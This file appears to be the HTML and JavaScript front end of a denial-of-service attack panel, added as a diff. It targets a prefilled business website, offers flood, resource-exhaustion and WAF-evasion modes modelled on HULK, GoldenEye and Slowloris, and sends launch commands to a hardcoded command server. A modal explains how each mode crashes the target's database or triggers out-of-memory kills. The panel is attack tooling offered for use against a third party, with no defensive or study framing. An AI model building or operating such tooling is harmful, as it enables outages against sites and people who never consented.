@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Strategic Cyber Command</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body { background-color: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', sans-serif; }
+        .glass-panel { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid #334155; }
+        .glow-text { text-shadow: 0 0 10px rgba(56, 189, 248, 0.5); }
+        .console-text { font-family: 'Courier New', monospace; }
+        
+        /* Log Colors */
+        .log-info { color: #38bdf8; }
+        .log-success { color: #4ade80; }
+        .log-warning { color: #facc15; }
+        .log-error { color: #f87171; }
+
+        /* Snake Animation */
+        @keyframes snake-bite {
+            0% { transform: scale(1) rotate(0deg); }
+            25% { transform: scale(1.1) rotate(-5deg); }
+            50% { transform: scale(1.2) rotate(5deg); }
+            75% { transform: scale(1.1) rotate(-5deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+        .snake-active { animation: snake-bite 0.5s infinite; filter: drop-shadow(0 0 10px #ef4444); }
+        .snake-idle { opacity: 0.3; filter: grayscale(100%); transition: all 0.5s; }
+    </style>
+</head>
+<body class="min-h-screen bg-slate-900 text-slate-200 font-sans">
+
+    <!-- Header -->
+    <header class="bg-slate-900 border-b border-slate-700 p-4 flex flex-col md:flex-row justify-between items-center shadow-md z-10 sticky top-0">
+        <div class="flex items-center gap-3 mb-2 md:mb-0">
+            <div id="snakeIcon" class="text-3xl snake-idle">🐍</div>
+            <div class="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
+            <h1 class="text-xl md:text-2xl font-bold text-sky-400 glow-text tracking-wider">STRATEGIC CYBER COMMAND</h1>
+        </div>
+        <div class="flex flex-wrap justify-center gap-4 text-xs md:text-sm text-slate-400 font-mono">
+            <span>NODE: <span class="text-white">76.13.179.65</span></span>
+            <span>STATUS: <span class="text-green-400">ONLINE</span></span>
+            <button onclick="resetDashboard()" class="text-red-400 hover:text-red-300 ml-4 border border-red-900 px-2 rounded hover:bg-red-900/20 transition-all">
+                ⚠️ RESET SYSTEM
+            </button>
+        </div>
+    </header>
+
+    <!-- Main Layout -->
+    <div class="flex flex-col lg:flex-row p-4 gap-4 md:p-6 md:gap-6 relative h-full lg:h-[calc(100vh-80px)] overflow-y-auto lg:overflow-hidden">
+        
+        <!-- Left Panel: Controls -->
+        <div class="w-full lg:w-1/3 flex flex-col gap-6 z-10 shrink-0">
+            <!-- Launch Config -->
+            <div class="glass-panel p-4 md:p-6 rounded-xl shadow-lg border-t-4 border-sky-600">
+                <h2 class="text-lg font-semibold text-white mb-4 border-b border-slate-700 pb-2 flex justify-between">
+                    OPERATION CONFIGURATION
+                    <span id="opStatus" class="text-xs py-1 px-2 rounded bg-slate-800 text-slate-400">IDLE</span>
+                </h2>
+                
+                <div class="flex flex-col gap-4">
+                    <div>
+                        <label class="text-xs font-bold text-slate-400">TARGET URL</label>
+                        <div class="flex gap-2 mt-1">
+                            <input type="text" id="targetUrl" value="https://salparts.com" class="flex-1 bg-slate-800 border border-slate-600 rounded p-2 text-white focus:border-sky-500 outline-none transition-colors">
+                            <button onclick="verifyTarget()" class="bg-slate-700 hover:bg-slate-600 text-white px-3 rounded text-xs font-bold border border-slate-600" title="Check Connectivity">
+                                🔍 TEST
+                            </button>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center">
+                            <label class="text-xs font-bold text-slate-400">ATTACK MODE</label>
+                            <button onclick="showTacticalInfo()" class="text-[10px] text-sky-400 hover:text-sky-300 underline cursor-pointer">Attack Mode Guide</button>
+                        </div>
+                        <select id="attackMode" class="w-full bg-slate-800 border border-slate-600 rounded p-2 text-white mt-1 focus:border-sky-500 outline-none">
+                            <option value="standard">Standard Flood (GET) - DB/Web Saturation</option>
+                            <option value="heavy">Infrastructure Stress (POST) - RAM/CPU Exhaustion</option>
+                            <option value="research">GitHub Research (GoldenEye/HULK) - Bypass & Evasion</option>
+                        </select>
+                        <p class="text-[10px] text-slate-500 mt-1 italic">Research Mode uses advanced randomization (Headers, Referrers) to bypass basic WAFs.</p>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="text-xs font-bold text-slate-400">CONCURRENCY</label>
+                            <input type="number" id="concurrency" value="1000" class="w-full bg-slate-800 border border-slate-600 rounded p-2 text-white mt-1 focus:border-sky-500 outline-none">
+                            <button onclick="setMaxPower()" class="w-full mt-1 text-[10px] bg-red-900/50 hover:bg-red-900 text-red-200 border border-red-800 rounded py-1 transition-all">⚡ SET MAX POWER (5000)</button>
+                        </div>
+                        <div>
+                            <label class="text-xs font-bold text-slate-400">ATTACK DURATION (SECONDS)</label>
+                            <input type="number" id="duration" value="120" class="w-full bg-slate-800 border border-slate-600 rounded p-2 text-white mt-1 focus:border-sky-500 outline-none">
+                        </div>
+                    </div>
+
+                    <div class="flex gap-2 mt-4">
+                        <button id="launchBtn" onclick="startCampaign()" class="flex-1 bg-gradient-to-r from-red-600 to-red-800 hover:from-red-500 hover:to-red-700 text-white font-bold py-3 rounded transition-all shadow-lg shadow-red-900/40 border border-red-500 opacity-50 cursor-not-allowed">
+                            🚀 LAUNCH ATTACK
+                        </button>
+                        <button onclick="stopCampaign()" class="w-1/4 bg-slate-800 hover:bg-slate-700 text-white font-bold py-3 rounded transition-all border border-slate-600">
+                            🛑 STOP
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Console -->
+            <div class="glass-panel p-0 rounded-xl flex-1 flex flex-col overflow-hidden border-t-4 border-slate-600">
+                <div class="bg-slate-800 p-2 text-xs font-bold text-slate-400 border-b border-slate-700 flex justify-between px-4">
+                    <span>LIVE SYSTEM LOGS</span>
+                    <span class="animate-pulse text-green-500">●</span>
+                </div>
+                <div class="flex-1 bg-black p-3 font-mono text-xs overflow-y-auto" id="logs">
+                    <div class="text-slate-500">[SYSTEM] Dashboard Initialized...</div>
+                    <div class="text-slate-500">[SYSTEM] Connected to WebSocket Stream...</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Panel: Live Metrics -->
+        <div class="w-full lg:w-2/3 flex flex-col gap-6 z-10">
+            
+            <!-- KPIs -->
+            <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+                <div class="glass-panel p-4 rounded-xl border-l-4 border-sky-500">
+                    <div class="text-slate-400 text-[10px] font-bold tracking-widest uppercase">Throughput</div>
+                    <div class="text-3xl font-bold text-white mt-1"><span id="rpsVal">0</span> <span class="text-sm text-slate-500">req/s</span></div>
+                </div>
+                <div class="glass-panel p-4 rounded-xl border-l-4 border-slate-500">
+                    <div class="text-slate-400 text-[10px] font-bold tracking-widest uppercase">Total Sent</div>
+                    <div class="text-3xl font-bold text-white mt-1" id="totalReq">0</div>
+                </div>
+                <div class="glass-panel p-4 rounded-xl border-l-4 border-red-500">
+                    <div class="text-slate-400 text-[10px] font-bold tracking-widest uppercase">Errors / Dropped</div>
+                    <div class="text-3xl font-bold text-red-400 mt-1" id="failedReq">0</div>
+                </div>
+                <div class="glass-panel p-4 rounded-xl border-l-4 border-green-500">
+                    <div class="text-slate-400 text-[10px] font-bold tracking-widest uppercase">Data (MB)</div>
+                    <div class="text-3xl font-bold text-green-400 mt-1" id="dataReq">0</div>
+                </div>
+            </div>
+
+            <!-- Charts -->
+            <div class="glass-panel p-4 rounded-xl flex-1 flex flex-col border border-slate-700 min-h-[300px] lg:h-1/3">
+                <div class="flex justify-between items-center mb-4">
+                    <h2 class="text-sm font-bold text-slate-300">NETWORK TRAFFIC ANALYSIS</h2>
+                    <div class="flex gap-2">
+                        <span class="text-xs text-sky-400">● Throughput</span>
+                    </div>
+                </div>
+                <div class="flex-1 relative">
+                    <canvas id="trafficChart"></canvas>
+                </div>
+            </div>
+            
+            <!-- Live HTTP Inspector -->
+            <div class="glass-panel p-0 rounded-xl flex-1 flex flex-col overflow-hidden border-t-4 border-purple-600 min-h-[300px] lg:h-1/3">
+                <div class="bg-slate-800 p-2 text-xs font-bold text-purple-400 border-b border-slate-700 flex justify-between px-4">
+                    <span>LIVE TARGET MONITOR (REAL-TIME)</span>
+                    <span class="text-xs text-slate-500">Last 50 Responses</span>
+                </div>
+                <div class="flex-1 bg-[#0d1117] p-0 overflow-y-auto" id="httpInspector">
+                    <div class="p-4 text-slate-600 italic text-center text-xs">// Waiting for live traffic...</div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Tactical Info Modal -->
+    <div id="tacticalModal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4 backdrop-blur-sm">
+        <div class="glass-panel p-6 rounded-xl max-w-2xl w-full shadow-2xl border border-slate-600 relative">
+            <button onclick="document.getElementById('tacticalModal').classList.add('hidden')" class="absolute top-4 right-4 text-slate-400 hover:text-white">✕</button>
+            
+            <h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2">
+                <span class="text-sky-400">ℹ️</span> TACTICAL INTELLIGENCE: TARGET ANALYSIS
+            </h2>
+            
+            <div class="space-y-4 text-sm text-slate-300">
+                <div class="bg-slate-800/50 p-4 rounded border-l-4 border-yellow-500">
+                    <h3 class="font-bold text-yellow-400 mb-1">❓ WHY DID ONLY MARIADB FAIL?</h3>
+                    <p>Standard Flood (GET) exhausts <strong>database connections</strong>. Each web request forces the server to open a DB connection. Once the limit (e.g., 150) is reached, the DB crashes, but other services (Mail, SSH) stay up.</p>
+                </div>
+
+                <div class="bg-slate-800/50 p-4 rounded border-l-4 border-red-500">
+                    <h3 class="font-bold text-red-400 mb-1">🔥 INFRASTRUCTURE STRESS (POST)</h3>
+                    <p>Sends large junk data. Forces the server to use <strong>RAM & CPU</strong> to process it. High RAM usage triggers the <strong>OOM Killer</strong>, which starts killing random processes (Mail, SSH, FTP).</p>
+                </div>
+
+                <div class="bg-slate-800/50 p-4 rounded border-l-4 border-purple-500">
+                    <h3 class="font-bold text-purple-400 mb-1">🧠 GITHUB RESEARCH (HYBRID MODE)</h3>
+                    <p>Combines advanced techniques found in <strong>HULK, GoldenEye, and Slowloris</strong>:</p>
+                    <ul class="list-disc list-inside ml-2">
+                        <li><strong>Volume:</strong> Random User-Agents & Dynamic Parameters (Bypasses Cache/WAF).</li>
+                        <li><strong>Persistence:</strong> Slowloris Low-and-Slow attacks to hold server threads open.</li>
+                        <li><strong>Evasion:</strong> Mixed GET/POST methods to confuse defense logic.</li>
+                    </ul>
+                    <p>Use this to target the <strong>entire stack</strong> (Web Server Threads + CPU + WAF).</p>
+                </div>
+            </div>
+            
+            <div class="mt-6 flex justify-end">
+                <button onclick="document.getElementById('tacticalModal').classList.add('hidden')" class="bg-sky-600 hover:bg-sky-500 text-white px-6 py-2 rounded font-bold transition-all">
+                    UNDERSTOOD
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showTacticalInfo() {
+            document.getElementById('tacticalModal').classList.remove('hidden');
+        }
+
+        const API_BASE = "http://76.13.179.65:8000";
+        const WS_URL = "ws://76.13.179.65:8000/ws/telemetry";
+        
+        // Chart Setup
+        Chart.defaults.color = '#64748b';
+        Chart.defaults.borderColor = '#334155';
+        
+        const ctx = document.getElementById('trafficChart').getContext('2d');
+        const gradient = ctx.createLinearGradient(0, 0, 0, 400);
+        gradient.addColorStop(0, 'rgba(56, 189, 248, 0.5)');
+        gradient.addColorStop(1, 'rgba(56, 189, 248, 0.0)');
+
+        const trafficChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: [],
+                datasets: [{
+                    label: 'RPS',
+                    data: [],
+                    borderColor: '#38bdf8',
+                    backgroundColor: gradient,
+                    borderWidth: 2,
+                    fill: true,
+                    tension: 0.4,
+                    pointRadius: 0,
+                    pointHoverRadius: 4
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                interaction: { intersect: false, mode: 'index' },
+                plugins: { legend: { display: false }, tooltip: { backgroundColor: '#1e293b', titleColor: '#fff', bodyColor: '#cbd5e1' } },
+                scales: {
+                    x: { grid: { display: false } },
+                    y: { grid: { color: '#334155', borderDash: [5, 5] }, beginAtZero: true }
+                },
+                animation: { duration: 0 } // Performance optimization
+            }
+        });
+
+        // WebSocket Connection
+        let ws;
+        function connectWS() {
+            ws = new WebSocket(WS_URL);
+            ws.onopen = () => {
+                log("WebSocket Connected.", "success");
+                // Enable and Flash Launch Button
+                const btn = document.getElementById('launchBtn');
+                btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                btn.classList.add('animate-pulse', 'ring-4', 'ring-red-500');
+                setTimeout(() => btn.classList.remove('ring-4', 'ring-red-500'), 2000); // Stop ring after 2s
+            };
+            ws.onmessage = (event) => {
+                const msg = JSON.parse(event.data);
+                if (msg.type === "telemetry") {
+                    updateDashboard(msg.data);
+                } else if (msg.type === "log") {
+                    log(msg.data.message, msg.data.level);
+                } else if (msg.type === "inspector") {
+                    updateInspector(msg.data);
+                }
+            };
+            ws.onclose = () => {
+                log("WebSocket Disconnected. Reconnecting...", "warning");
+                // Disable Button
+                const btn = document.getElementById('launchBtn');
+                btn.classList.add('opacity-50', 'cursor-not-allowed');
+                btn.classList.remove('animate-pulse');
+                setTimeout(connectWS, 2000);
+            };
+        }
+
+        function updateDashboard(data) {
+            document.getElementById('rpsVal').innerText = Math.round(data.rps).toLocaleString();
+            document.getElementById('totalReq').innerText = data.requests.toLocaleString();
+            document.getElementById('failedReq').innerText = data.failed.toLocaleString();
+            document.getElementById('dataReq').innerText = (data.bytes / (1024*1024)).toFixed(2);
+            
+            // Update Chart
+            const now = new Date().toLocaleTimeString();
+            if (trafficChart.data.labels.length > 60) { // Keep last 60 seconds
+                trafficChart.data.labels.shift();
+                trafficChart.data.datasets[0].data.shift();
+            }
+            trafficChart.data.datasets[0].data.push(data.rps);
+            trafficChart.data.labels.push(now);
+            trafficChart.update('none'); // Efficient update
+        }
+
+        function updateInspector(data) {
+            const container = document.getElementById('httpInspector');
+            
+            // Remove initial placeholder if exists
+            if (container.querySelector('.text-center')) {
+                container.innerHTML = '';
+            }
+
+            const entry = document.createElement('div');
+            // Check status for color
+            const isSuccess = data.status < 400;
+            const statusColor = isSuccess ? "bg-green-500/10 border-green-500/30 text-green-400" : "bg-red-500/10 border-red-500/30 text-red-400";
+            const icon = isSuccess ? "🟢" : "🔴";
+            
+            entry.className = `flex justify-between items-center p-2 border-b border-slate-800 hover:bg-slate-800/50 transition-colors text-[10px] font-mono ${statusColor}`;
+            
+            entry.innerHTML = `
+                <div class="flex items-center gap-2 truncate">
+                    <span class="text-lg">${icon}</span>
+                    <div class="flex flex-col">
+                        <span class="font-bold text-slate-300 truncate w-48">${data.url}</span>
+                        <span class="text-slate-500">${data.timestamp} | ${data.latency}</span>
+                    </div>
+                </div>
+                <div class="font-bold text-xs px-2 py-1 rounded border border-current opacity-80">
+                    HTTP ${data.status}
+                </div>
+            `;
+            
+            // Keep only last 50 entries
+            if (container.children.length > 50) {
+                container.removeChild(container.lastChild);
+            }
+            container.prepend(entry);
+        }
+
+        // API Controls
+        function setMaxPower() {
+            document.getElementById('concurrency').value = "5000";
+            document.getElementById('duration').value = "300";
+            document.getElementById('attackMode').value = "research";
+            log("MAX POWER CONFIGURATION ENABLED.", "warning");
+        }
+
+        async function verifyTarget() {
+            const target = document.getElementById('targetUrl').value;
+            log(`Testing connectivity to ${target}...`, "info");
+            try {
+                const res = await fetch(`${API_BASE}/api/verify`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_url: target })
+                });
+                const data = await res.json();
+                if (data.status === "online") {
+                    let details = `Target is ONLINE (HTTP ${data.code}) - ${data.latency}ms`;
+                    if (data.geo) {
+                        details += `<br><span class="text-xs text-slate-400">IP: ${data.ip} | ${data.geo.country} | ${data.geo.isp}</span>`;
+                    }
+                    if (data.is_cloudflare) {
+                        details += `<br><span class="text-xs text-orange-400 font-bold">⚠️ CLOUDFLARE DETECTED</span>`;
+                    }
+                    log(details, "success");
+                    // Add to inspector to prove it
+                    updateInspector({
+                        url: target,
+                        status: data.code,
+                        headers: data.headers,
+                        latency: data.latency + "ms",
+                        timestamp: new Date().toLocaleTimeString()
+                    });
+                } else {
+                    log(`Target seems OFFLINE or UNREACHABLE: ${data.error}`, "error");
+                }
+            } catch (e) {
+                log("Verification Failed: " + e.message, "error");
+            }
+        }
+
+        async function startCampaign() {
+            const target = document.getElementById('targetUrl').value;
+            const mode = document.getElementById('attackMode').value;
+            const concurrency = parseInt(document.getElementById('concurrency').value);
+            const duration = parseInt(document.getElementById('duration').value);
+            
+            document.getElementById('opStatus').innerText = "STARTING...";
+            document.getElementById('opStatus').className = "text-xs py-1 px-2 rounded bg-yellow-900 text-yellow-200";
+            
+            try {
+                const res = await fetch(`${API_BASE}/api/campaigns/start`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_url: target, mode, concurrency, duration })
+                });
+                
+                if (res.ok) {
+                    const data = await res.json();
+                    document.getElementById('opStatus').innerText = "RUNNING";
+                    document.getElementById('opStatus').className = "text-xs py-1 px-2 rounded bg-green-900 text-green-200 animate-pulse";
+                    
+                    // Activate Snake
+                    const snake = document.getElementById('snakeIcon');
+                    snake.classList.remove('snake-idle');
+                    snake.classList.add('snake-active');
+                    
+                    log(`Launched in ${mode.toUpperCase()} mode.`, "success");
+                } else {
+                    const err = await res.json();
+                    log(`Launch Failed: ${err.detail}`, "error");
+                    document.getElementById('opStatus').innerText = "ERROR";
+                    document.getElementById('opStatus').className = "text-xs py-1 px-2 rounded bg-red-900 text-red-200";
+                }
+            } catch (e) {
+                log("API Error: " + e.message, "error");
+            }
+        }
+
+        async function stopCampaign() {
+            await fetch(`${API_BASE}/api/campaigns/stop`, { method: 'POST' });
+            document.getElementById('opStatus').innerText = "STOPPED";
+            document.getElementById('opStatus').className = "text-xs py-1 px-2 rounded bg-slate-800 text-slate-400";
+            
+            // Deactivate Snake
+            const snake = document.getElementById('snakeIcon');
+            snake.classList.remove('snake-active');
+            snake.classList.add('snake-idle');
+        }
+
+        async function resetDashboard() {
+            if(confirm("Are you sure you want to reset all data?")) {
+                trafficChart.data.labels = [];
+                trafficChart.data.datasets[0].data = [];
+                trafficChart.update();
+                document.getElementById('rpsVal').innerText = "0";
+                document.getElementById('totalReq').innerText = "0";
+                document.getElementById('failedReq').innerText = "0";
+                document.getElementById('dataReq').innerText = "0";
+                document.getElementById('logs').innerHTML = "";
+                document.getElementById('httpInspector').innerHTML = '<div class="p-4 text-slate-600 italic text-center text-xs">// Waiting for live traffic...</div>';
+                log("Dashboard Reset Complete.", "info");
+                await fetch(`${API_BASE}/api/system/reset`, { method: 'POST' });
+            }
+        }
+
+        function log(msg, level="info") {
+            const logs = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = `log-${level} mb-1`;
+            div.innerHTML = `<span class="opacity-50">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            logs.appendChild(div);
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        connectWS();
+    </script>
+</body>
+</html>
